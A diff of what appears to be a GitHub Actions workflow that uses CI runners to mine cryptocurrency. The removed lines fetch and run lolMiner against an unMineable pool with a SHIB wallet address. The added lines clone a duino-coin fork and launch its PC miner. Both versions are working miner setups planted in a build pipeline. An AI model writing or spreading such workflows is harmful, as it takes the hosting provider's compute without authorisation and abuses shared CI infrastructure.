@@ -25,14 +25,11 @@ jobs:
      runner: [0]
    steps:
      - run: |
-        wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
-
-        tar -xf lolMiner_v1.29_Lin64.tar.gz
-
-        cd 1.29
-
-        ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0xadA2E211aC8a812f1D2e9d33e16d173C28f1519b.God_miner_YT#5xer-nxch --ethstratum ETHPROXY
-
-        mkdir Duino-Coin PC Miner 2.73
+        sudo apt update
+        sudo apt install python3 python3-pip git python3-pil python3-pil.imagetk -y # Install dependencies
+        git clone https://github.com/shah77pc/duino-coin
+        cd duino-coin
+        python3 -m pip install -r requirements.txt # Install pip dependencies
+        
       
         python duino-coin/PC_Miner.py
